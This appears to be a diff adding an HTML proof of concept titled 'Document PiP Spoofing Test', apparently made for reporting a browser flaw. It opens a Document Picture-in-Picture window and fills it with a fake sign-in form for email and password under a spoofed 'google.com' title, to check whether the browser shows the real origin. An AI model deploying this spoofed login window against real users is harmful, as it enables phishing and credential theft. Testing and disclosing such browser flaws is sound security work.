@@ -1,0 +1,76 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Main Page</title>
+</head>
+<body>
+
+<h3>Document PiP Spoofing Test</h3>
+<button id="open">Open PiP Window</button>
+
+<script>
+document.getElementById("open").onclick = async () => {
+
+  if (!("documentPictureInPicture" in window)) {
+    alert("Document Picture-in-Picture not supported");
+    return;
+  }
+
+  const pip = await documentPictureInPicture.requestWindow({
+    width: 420,
+    height: 520
+  });
+
+  // Attacker-controlled content inside PiP
+  pip.document.write(`
+    <!doctype html>
+    <html>
+    <head>
+      <!-- Spoofed trusted title -->
+      <title>google.com</title>
+
+      <style>
+        body {
+          margin:0;
+          font-family: system-ui, sans-serif;
+          background:#f2f2f2;
+        }
+        .card {
+          margin:40px;
+          padding:20px;
+          background:white;
+          border-radius:8px;
+          box-shadow:0 10px 30px rgba(0,0,0,.2);
+        }
+        input {
+          width:100%;
+          padding:8px;
+          margin:8px 0;
+        }
+        button {
+          width:100%;
+          padding:10px;
+        }
+      </style>
+    </head>
+    <body>
+      <div class="card">
+        <h3>Sign in</h3>
+        <input placeholder="Email">
+        <input type="password" placeholder="Password">
+        <button>Next</button>
+        <p style="font-size:12px;color:#666">
+          (PiP window – check if origin is shown above)
+        </p>
+      </div>
+    </body>
+    </html>
+  `);
+
+  pip.document.close();
+};
+</script>
+
+</body>
+</html>
